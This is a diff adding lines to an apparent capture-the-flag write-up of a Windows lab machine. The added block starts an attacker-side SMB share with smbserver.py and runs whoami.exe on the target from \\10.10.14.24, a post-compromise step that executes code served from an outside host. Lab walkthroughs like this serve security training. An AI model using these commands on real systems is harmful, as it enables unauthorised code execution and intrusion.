@@ -55,6 +55,15 @@ type root.txt
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/78dea999-1856-426b-afe3-69aad9bab9de)
 
 
+```
+smbserver.py win /usr/share/windows-binaries/
+
+\\10.10.14.24\win\whoami.exe
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/168b61ac-c71d-4f60-8568-a9e1223f669a)
+
+
 
 # References & Alternatives
 + https://vvmlist.github.io/#legacy
